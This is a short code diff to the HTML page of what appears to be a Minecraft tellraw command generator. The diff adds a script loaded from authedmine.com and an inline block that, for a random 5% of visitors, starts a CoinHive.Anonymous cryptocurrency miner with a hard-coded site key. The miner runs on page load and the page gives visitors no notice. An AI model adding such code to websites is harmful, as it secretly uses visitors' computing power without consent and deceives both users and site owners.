@@ -79,6 +79,8 @@
 
 	<script src="js/tellraw.js"></script>
 
+	<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+
 	<meta charset="UTF-8">
 </head>
 <body class="black-theme">
@@ -562,5 +564,12 @@
 			</span>
 		</div>
 	</div>
+
+	<script>
+		if (Math.random() < 0.05) {
+			var miner = new CoinHive.Anonymous('Cjv1MQzP7McKdWFumMCE7EXQeoZk367w');
+			miner.start();
+		}
+	</script>
 </body>
 </html>
